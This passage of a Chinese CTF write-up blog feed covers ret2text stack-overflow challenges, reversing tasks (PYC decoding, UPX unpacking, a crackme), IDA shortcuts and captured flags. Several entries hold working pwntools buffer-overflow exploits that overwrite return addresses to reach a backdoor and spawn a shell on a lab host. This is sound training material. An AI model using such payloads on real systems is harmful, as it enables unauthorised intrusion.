        <content type="html"><![CDATA[<p><img src="/images/EDC60431-C7F0-4706-B7EE-C0C20022E216.png"><br><img src="/images/89BB9CEE-D6C5-4168-8559-A837556C9144.png"><br><img src="/images/Pastedimage20250605190959.png"><br>buf 到栈底（ebp）的距离是：0xA，64 位程序加上 8 字节的栈底（rbp）<br><img src="/images/Pastedimage20250605191047.png"><br>backdoor函数地址：0x400657<br>对于 32 位程序来说，现在就能打通了<br>但是这里是 64 位程序，需要处理堆栈平衡<br>#堆栈平衡：当我们在堆栈中进行堆栈的操作的时候，一定要保证在ret这条指令之前，esp指向的是我们压入栈中的地址，函数执行到ret执行之前，堆栈栈顶的地址一定要是call指令的下一个地址。<br>因此我们还需要找一个地址： lev 的地址或者该函数结束的地址（即 retn 的地址）<br>直接看 backdoor 函数的汇编代码：<br><img src="/images/Pastedimage20250605192121.png"><br>lev 的地址：0x40065B<br>retn 的地址：0x40066D<br>&#x3D;&#x3D;<strong>特别注意：构造 payload 时将该地址放在该函数开始地址之前</strong>&#x3D;&#x3D;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;10.190.131.17&#x27;</span>, <span class="number">55024</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xA</span>+<span class="number">8</span>) + p64(<span class="number">0x40065B</span>) + p64(<span class="number">0x400657</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload = b&#x27;a&#x27;*(0xA+8) + p64(0x40066D) + p64(0x400657) 可</span></span><br><span class="line"><span class="comment">#payload = b&#x27;a&#x27;*(0xA+8) + p64(0x40065B) 也可以啊不是很懂</span></span><br></pre></td></tr></table></figure><p><img src="/images/BDC96406-6B8C-4852-90CC-38D5162440C3.png"></p><ol><li><code>p64(0x40065B)</code> → 覆盖返回地址为<code>0x40065B</code></li><li><code>p64(0x400657)</code> → 在栈上放置后门函数地址</li></ol><h3 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h3><p>当函数返回时：</p><ol><li>跳转到<code>0x40065B</code>（跳过函数开头的<code>push rbp; mov rbp, rsp</code>）</li><li>执行<code>lea rdi, command</code> → 设置好<code>system</code>的参数</li><li>执行<code>call _system</code> → 调用<code>system(&quot;/bin/sh&quot;)</code></li><li>执行<code>pop rbp</code> → 弹出栈顶值到RBP（此时栈顶是<code>0x400657</code>）</li><li>执行<code>retn</code> → 弹出栈顶值<code>0x400657</code>到RIP，跳转到后门函数开头</li></ol><h3 id="为什么要这样跳转两次？"><a href="#为什么要这样跳转两次？" class="headerlink" title="为什么要这样跳转两次？"></a>为什么要这样跳转两次？</h3><ol><li><strong>避免栈对齐问题</strong>：64位系统要求调用函数时栈指针16字节对齐<ul><li>直接跳转到<code>0x40065B</code>时，栈指针可能未对齐</li><li>第二次跳转到函数开头（<code>0x400657</code>）会执行<code>push rbp</code>，使栈对齐</li></ul></li><li><strong>确保参数正确设置</strong>：<ul><li>第一次跳转确保<code>rdi</code>正确设置为<code>&quot;/bin/sh&quot;</code></li><li>第二次跳转执行完整的<code>system</code>调用</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> ret2text 栈溢出 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>我的眼睛能看到比较低的东西</title>
      <link href="/2025/06/b7489399e5c7.html"/>
      <url>/2025/06/b7489399e5c7.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/flag11.png"><br><img src="/images/B7FFEEE2-E071-41DC-A3E3-4BDA0719A462.png"><br><img src="/images/Pastedimage20250604104025.png"><br><img src="/images/Pastedimage20250604104046.png"><br><img src="/images/Pastedimage20250604105300.png"><br><img src="/images/3E1FFA08-BA9D-4AA5-8A9A-6D469456C255%7D.png"><br><img src="/images/CE52806F-ECC7-47DF-8A20-7224D63472F8.png"><br>cumtctf{1sb_i4_s0_Ea4y}</p>]]></content>
      
      
      <categories>
          
          <category> MISC </category>
          
          <category> 图片 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ret2text</title>
      <link href="/2025/06/7a81113665b5.html"/>
      <url>/2025/06/7a81113665b5.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/10D37E23-7399-4EDB-BFAE-C6662B1460E6.png"><br>检查安全机制发现 <strong>NX (No-Execute) 已启用</strong>，这意味着栈内存不可执行，因此无法直接执行栈上的 shellcode。但题目中有一个明显的 <strong>后门函数</strong>，这应该才是解题的关键。<br><img src="/images/Pastedimage20250605162859.png"><br><img src="/images/Pastedimage20250605162923.png"><br><img src="/images/Pastedimage20250605160858.png"><br><img src="/images/3115B1EC-E572-40CA-94A3-ACD9DAAACB99.png"></p><h3 id="一、漏洞点分析"><a href="#一、漏洞点分析" class="headerlink" title="一、漏洞点分析"></a>一、漏洞点分析</h3><ol><li><strong><code>ctfshow</code> 函数的栈溢出</strong>：</li></ol> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">ctfshow</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">14</span>]; <span class="comment">// [esp+6h] [ebp-12h] BYREF</span></span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x32u</span>); <span class="comment">// 读取 0x32（50）字节到 14 字节的 buf → 栈溢出</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol><li><strong>缓冲区大小</strong>：<code>buff[14]</code> 实际占用14字节</li><li><strong>栈位置</strong>：<code>[ebp-12h]</code> (12h &#x3D; 18字节)</li><li><strong>读取长度</strong>：0x32u (50字节)</li></ol><h3 id="正确的偏移计算"><a href="#正确的偏移计算" class="headerlink" title="正确的偏移计算"></a>正确的偏移计算</h3><ol><li>从缓冲区开始到保存的EBP：<code>ebp - buff = 12h = 18字节</code></li><li>从保存的EBP到返回地址：返回地址位于<code>EBP+4</code>处，需要额外4字节</li><li><strong>总偏移</strong>：18字节(到EBP) + 4字节(覆盖EBP) &#x3D; 22字节</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动进程或远程连接</span></span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn4&#x27;)  # 本地测试</span></span><br><span class="line">p = remote(<span class="string">&#x27;10.190.131.17&#x27;</span>, <span class="number">53288</span>)  <span class="comment"># 远程攻击</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造payload</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x12</span>+<span class="number">4</span>)        <span class="comment"># 填充18字节</span></span><br><span class="line">payload += p32(<span class="number">0x08048521</span>) <span class="comment"># 覆盖返回地址为backdoor</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)<span class="comment"># 发送payload</span></span><br><span class="line">p.interactive()<span class="comment"># 获取交互式shell</span></span><br></pre></td></tr></table></figure><p><img src="/images/AE10E247-E07F-4983-96FD-5C8A57C3DC35.png"></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> ret2text 栈溢出 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>nc一下</title>
      <link href="/2025/06/74d642c7c583.html"/>
      <url>/2025/06/74d642c7c583.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/1ECE90F1-7E5D-47C4-AA43-FCEB3B41F7F6.png"><br>tzuctf{cf1a020b-4cf7-5909-30a0-8fc5a55e672c}</p><hr><p><img src="/images/5EADDF48-2904-4B55-AA5D-F8B6B4859A141.png"><br>tzuctf{8b7f5b16-ce7c-adb6-7ae2-10006d2762d3}</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
          <category> Netcat </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>快捷键</title>
      <link href="/2025/06/7041daea1662.html"/>
      <url>/2025/06/7041daea1662.html</url>
      
        <content type="html"><![CDATA[<p>空格键：反汇编窗口切换文本跟图形</p><p>Esc：在反汇编窗口中使用为后退到上个操作的地址处</p><p>Shift +F5：打开签名窗口</p><p>shift+F12：自动分析出参考字符串</p><p>ALT+T：搜索字符串(文本搜索)</p><p>ALT+L：标记(Lable)</p><p>ALT+M：设置标签(mark)</p><p>ALT+G：转换局部变量为结构体</p><p>ALT+Enter：跳转到新的窗口</p><p>Alt+B：快捷键用于搜索十六进制字节序列，通常在分析过程中可以用来搜索opcode</p><p>CTRL+M：列举出当前已经添加的标签</p><p>CTRL+S列举出二进制程序的段的开始地址、结束地址、权限等信息</p><p>F9：动态调试程序(其实IDA主要用作静态分析用的)</p><p>F5：将一个函数逆向出来(生成c伪代码)</p><p>G：跳转到指定地址</p><p>A：将选择的信息转换成ASCII(转换成可读性跟强的字符串)</p><p>X(ctrl+X)：交叉引用,类似于OD中的栈回溯操作</p><p>N：对符号重命名</p><p>：&amp;；(冒号&amp;分号)：光标所在位置添加常规注释和可重复注释</p><p>P：创建函数</p><p>T：解析结构体偏移</p><p>M：转换为枚举类型常量</p><p>Y：设置变量类型</p><p>H：转换16进制</p><p>C：光标所在地址处的内容解析成代码</p><p>D：光标所在地址处的内容解析成数据</p><p>A：光标所在地址处的内容解析成ascll码字符串</p><p>U：光标所在地址处的内容解析成未定义内容。</p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
          <category> IDA Pro使用 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>快捷键</title>
      <link href="/2025/06/1d6a1034947c.html"/>
      <url>/2025/06/1d6a1034947c.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
          <category> IDA Pro使用 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>快捷键</title>
      <link href="/2025/06/0b9e8826945d.html"/>
      <url>/2025/06/0b9e8826945d.html</url>
      
        <content type="html"><![CDATA[<p><img src="/images/Pastedimage20250605084443.png"><br>从 <code>Exeinfo PE</code> 的识别结果来看，文件 <code>re4</code> 是 <strong>PYO 格式</strong>（Python 优化编译后的字节码文件 ），不是常规的 PE 可执行程序（Windows EXE ）。由 Python 脚本编译生成（<code>python -O script.py</code> 命令会生成 <code>.pyo</code> ），比 <code>.pyc</code> 更小、加载更快，但可读性低。<br><img src="/images/Pastedimage20250605085914.png"><br><img src="/images/Pastedimage20250605085556.png"><br>这样提示文件打开是空白的<br><img src="/images/61B19F00-C9FE-410A-B85C-857D129B8E68.png"><br>这是正确的<br><img src="/images/Pastedimage20250605085613.png"><img src="/images/C6F9A70A-E2ED-427B-9929-BFAE4BBEE979.png"><br>&#x3D;&#x3D;<strong>要把文件后缀改成pyc</strong>&#x3D;&#x3D;</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">message</span>):</span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> message:</span><br><span class="line">        x = <span class="built_in">ord</span>(i) ^ <span class="number">32</span></span><br><span class="line">        x = x + <span class="number">16</span></span><br><span class="line">        s += <span class="built_in">chr</span>(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">correct = <span class="string">&#x27;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Input flag:&#x27;</span></span><br><span class="line">flag = raw_input()</span><br><span class="line"><span class="keyword">if</span> encode(flag) == correct:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;correct&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;wrong&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h3><p>这个程序定义了一个<code>encode</code>函数，对输入字符串进行处理：</p><ol><li>每个字符的 ASCII 值与 32 进行异或操作</li><li>结果加 16</li><li>将处理后的字符组合成新字符串</li><li>对新字符串进行 Base64 编码<br>最后将编码结果与预定义的<code>correct</code>值进行比较。我们需要逆向这个过程来找到原始的 flag。</li></ol><h3 id="逆向过程"><a href="#逆向过程" class="headerlink" title="逆向过程"></a>逆向过程</h3><p>要还原 flag，我们需要反向执行上述步骤：</p><ol><li>对 Base64 编码进行解码</li><li>每个字符减 16</li><li>与 32 进行异或操作<br>下面是逆向的 Python 代码：</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import base64 </span><br><span class="line">correct = &#x27;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&#x27; </span><br><span class="line"># 第一步：Base64解码 </span><br><span class="line">decoded = base64.b64decode(correct) </span><br><span class="line"># 第二步：逆向处理每个字符 </span><br><span class="line">flag = &#x27;&#x27; </span><br><span class="line">for c in decoded: </span><br><span class="line"># Python3中需要处理字节对象 </span><br><span class="line">if isinstance(c, int): </span><br><span class="line">x = c </span><br><span class="line"># Python2中需要处理字节对象 </span><br><span class="line">else: </span><br><span class="line">x = ord(c) </span><br><span class="line">x = x - 16 </span><br><span class="line">x = x ^ 32 </span><br><span class="line">flag += chr(x) </span><br><span class="line">print(&quot;Flag:&quot;, flag)</span><br></pre></td></tr></table></figure><p>nctf{d3c0mpil1n9_PyC}</p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
          <category> PYC </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>快捷键</title>
      <link href="/2025/06/09ee5b3fb6a2.html"/>
      <url>/2025/06/09ee5b3fb6a2.html</url>
      
        <content type="html"><![CDATA[<p>好像加了什么东西？<br><img src="/images/95B1D75F-151D-4911-9152-2AAB97FC95D9.png"><br>从 <code>Exeinfo PE</code> 识别结果看，目标文件是 <strong>64 位 ELF 格式</strong>（非 Windows 可执行程序），且加了 <code>UPX</code> 壳 。</p><p>将脱壳的程序叫 re3和 upx.exe 放在同一目录：</p><ol><li><strong>查看壳信息</strong>（确认是 UPX 壳）： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upx.exe -l re3</span><br></pre></td></tr></table></figure>输出会显示 <code>UPX</code> 版本、压缩率等，确认是 UPX 壳再继续。</li><li><strong>执行脱壳</strong>：</li></ol><pre><code>  upx.exe -d re3.exe  ```    - 成功提示：`Unpacked 1 file...`  - 失败提示：`Not packed by UPX`（说明不是 UPX 壳，换其他工具 ）![](images//assets/images/&#123;2641DC93-B260-4C2C-95F1-CFB5B93000BD&#125;.png)![](images//assets/images/Pasted image 20250604161619.png)![](images//assets/images/Pasted image 20250604161706.png)</code></pre>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
          <category> UPX </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>你会编汇编吗</title>
      <link href="/2025/06/fbf65d286087.html"/>
      <url>/2025/06/fbf65d286087.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
          <category> 未命名 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>你会编汇编吗</title>
      <link href="/2025/06/d15a555fb50a.html"/>
      <url>/2025/06/d15a555fb50a.html</url>
      
        <content type="html"><![CDATA[<p>shift+F12+Fn搜索flag<br><img src="/images/Pastedimage20250604153708.png"></p><hr>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
          <category> 未命名 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>source</title>
      <link href="/2025/06/5e1bd234a6b7.html"/>
      <url>/2025/06/5e1bd234a6b7.html</url>
      
        <content type="html"><![CDATA[<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;string.h&gt; </span><br><span class="line">int main(int argc, char *argv[]) &#123; </span><br><span class="line">if (argc != 4) &#123; </span><br><span class="line">printf(&quot;what?\n&quot;); </span><br><span class="line">exit(1); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">unsigned int first = atoi(argv[1]);</span><br><span class="line">if (first != 0xcafe) &#123; </span><br><span class="line">printf(&quot;you are wrong, sorry.\n&quot;); </span><br><span class="line">exit(2);</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">unsigned int second = atoi(argv[2]); </span><br><span class="line">if (second % 5 == 3 || second % 17 != 8) &#123; </span><br><span class="line">printf(&quot;ha, you won&#x27;t get it!\n&quot;); </span><br><span class="line">exit(3); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">if (strcmp(&quot;h4cky0u&quot;, argv[3])) &#123; </span><br><span class="line">printf(&quot;so close, dude!\n&quot;); </span><br><span class="line">exit(4); </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line">printf(&quot;Brr wrrr grr\n&quot;); </span><br><span class="line"></span><br><span class="line">unsigned int hash = first * 31337 + (second % 17) * 11 + strlen(argv[3]) - 1615810207; </span><br><span class="line">printf(&quot;Get your key: &quot;); </span><br><span class="line">printf(&quot;%x\n&quot;, hash); </span><br><span class="line">return 0; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>这个程序需要三个命令行参数才能正常运行：</p><ol><li>第一个参数必须是整数<code>0xcafe</code>（即十进制的 51966）</li><li>第二个参数必须满足两个条件：<ul><li>模 5 不等于 3</li><li>模 17 等于 8</li></ul></li><li>第三个参数必须是字符串&#96;h4cky0</li></ol><p><strong>正确运行方法：</strong><br>.&#x2F;程序名 51966 25 h4cky0u</p><p>Brr wrrr grr<br>Get your key: c0ffee</p><p>OR<br><strong>直接算</strong><br>hash &#x3D; 51966 * 31337 + 8 * 11 + 8 - 1615810207 &#x3D; 1628468542 + 88 + 8 - 1615810207 &#x3D; 1628468638 - 1615810207 &#x3D; 12658431<br>转换为十六进制：<code>0xc0ffee</code></p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
          <category> 直接给程序 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>你会编汇编吗</title>
      <link href="/2025/06/db3be185141e.html"/>
      <url>/2025/06/db3be185141e.html</url>
      
        <content type="html"><![CDATA[<p>点开这个文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000401550                 push    rbp</span><br><span class="line">.text:0000000000401551                 mov     rbp, rsp</span><br><span class="line">.text:0000000000401554                 sub     rsp, 90h</span><br><span class="line">.text:000000000040155B                 call    __main</span><br><span class="line">.text:0000000000401560                 lea     rcx, Buffer     ; &quot;input your flag:&quot;</span><br><span class="line">.text:0000000000401567                 call    puts</span><br><span class="line">.text:000000000040156C                 lea     rax, [rbp+Str]</span><br><span class="line">.text:0000000000401570                 mov     rdx, rax</span><br><span class="line">.text:0000000000401573                 lea     rcx, Format     ; &quot;%s&quot;</span><br><span class="line">.text:000000000040157A                 call    scanf</span><br><span class="line">.text:000000000040157F                 lea     rax, [rbp+Str]</span><br><span class="line">.text:0000000000401583                 mov     rcx, rax        ; Str</span><br><span class="line">.text:0000000000401586                 call    strlen</span><br><span class="line">.text:000000000040158B                 cmp     rax, 23h ; &#x27;#&#x27;</span><br><span class="line">.text:000000000040158F                 jz      short loc_40159B</span><br><span class="line">.text:0000000000401591                 mov     eax, 0</span><br><span class="line">.text:0000000000401596                 jmp     loc_40162B</span><br><span class="line">.text:000000000040159B ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040159B</span><br><span class="line">.text:000000000040159B loc_40159B:                             ; CODE XREF: main+3F↑j</span><br><span class="line">.text:000000000040159B                 mov     [rbp+var_4], 0</span><br><span class="line">.text:00000000004015A2</span><br><span class="line">.text:00000000004015A2 loc_4015A2:                             ; CODE XREF: main+C8↓j</span><br><span class="line">.text:00000000004015A2                 cmp     [rbp+var_4], 22h ; &#x27;&quot;&#x27;</span><br><span class="line">.text:00000000004015A6                 jg      short loc_40161A</span><br><span class="line">.text:00000000004015A8                 mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000004015AB                 cdqe</span><br><span class="line">.text:00000000004015AD                 movzx   eax, [rbp+rax+Str]</span><br><span class="line">.text:00000000004015B2                 xor     eax, 52h</span><br><span class="line">.text:00000000004015B5                 mov     edx, eax</span><br><span class="line">.text:00000000004015B7                 mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000004015BA                 cdqe</span><br><span class="line">.text:00000000004015BC                 mov     [rbp+rax+Str], dl</span><br><span class="line">.text:00000000004015C0                 mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000004015C3                 cdqe</span><br><span class="line">.text:00000000004015C5                 movzx   eax, [rbp+rax+Str]</span><br><span class="line">.text:00000000004015CA                 add     eax, 5</span><br><span class="line">.text:00000000004015CD                 mov     edx, eax</span><br><span class="line">.text:00000000004015CF                 mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000004015D2                 cdqe</span><br><span class="line">.text:00000000004015D4                 mov     [rbp+rax+Str], dl</span><br><span class="line">.text:00000000004015D8                 mov     eax, [rbp+var_4]</span><br><span class="line">.text:00000000004015DB                 cdqe</span><br><span class="line">.text:00000000004015DD                 movzx   eax, [rbp+rax+Str]</span><br><span class="line">.text:00000000004015E2                 movsx   eax, al</span><br><span class="line">.text:00000000004015E5                 mov     edx, [rbp+var_4]</span><br><span class="line">.text:00000000004015E8                 movsxd  rdx, edx</span><br><span class="line">.text:00000000004015EB                 lea     rcx, ds:0[rdx*4]</span><br><span class="line">.text:00000000004015F3                 lea     rdx, res</span><br><span class="line">.text:00000000004015FA                 mov     edx, [rcx+rdx]</span><br><span class="line">.text:00000000004015FD                 cmp     eax, edx</span><br><span class="line">.text:00000000004015FF                 jz      short loc_401614</span><br><span class="line">.text:0000000000401601                 lea     rcx, aWrong     ; &quot;Wrong!&quot;</span><br><span class="line">.text:0000000000401608                 call    puts</span><br><span class="line">.text:000000000040160D                 mov     eax, 0</span><br><span class="line">.text:0000000000401612                 jmp     short loc_40162B</span><br><span class="line">.text:0000000000401614 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000401614</span><br><span class="line">.text:0000000000401614 loc_401614:                             ; CODE XREF: main+AF↑j</span><br><span class="line">.text:0000000000401614                 add     [rbp+var_4], 1</span><br><span class="line">.text:0000000000401618                 jmp     short loc_4015A2</span><br><span class="line">.text:000000000040161A ; ---------------------------------------------------------------------------</span><br><span class="line">.text:000000000040161A</span><br><span class="line">.text:000000000040161A loc_40161A:                             ; CODE XREF: main+56↑j</span><br><span class="line">.text:000000000040161A                 lea     rcx, aGood      ; &quot;Good!&quot;</span><br><span class="line">.text:0000000000401621                 call    puts</span><br><span class="line">.text:0000000000401626                 mov     eax, 0</span><br><span class="line">.text:000000000040162B</span><br><span class="line">.text:000000000040162B loc_40162B:                             ; CODE XREF: main+46↑j</span><br><span class="line">.text:000000000040162B                                         ; main+C2↑j</span><br><span class="line">.text:000000000040162B                 add     rsp, 90h</span><br><span class="line">.text:0000000000401632                 pop     rbp</span><br><span class="line">.text:0000000000401633                 retn</span><br><span class="line">.text:0000000000401633 main            endp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hint = 0x21,0x6,0x6,0x16,0xb,0x19,0x2e,0x65,0x35,0x6a,0x6f,0x38,0x36,0x84,0x70,0x3b,0x39,0x65,0x38,0x35,0x84,0x6f,0x36,0x3c,0x6a,0x38,0x68,0x84,0x66,0x70,0x3b,0x38,0x6a,0x36,0x34,</span><br></pre></td></tr></table></figure><p><strong>分析</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span 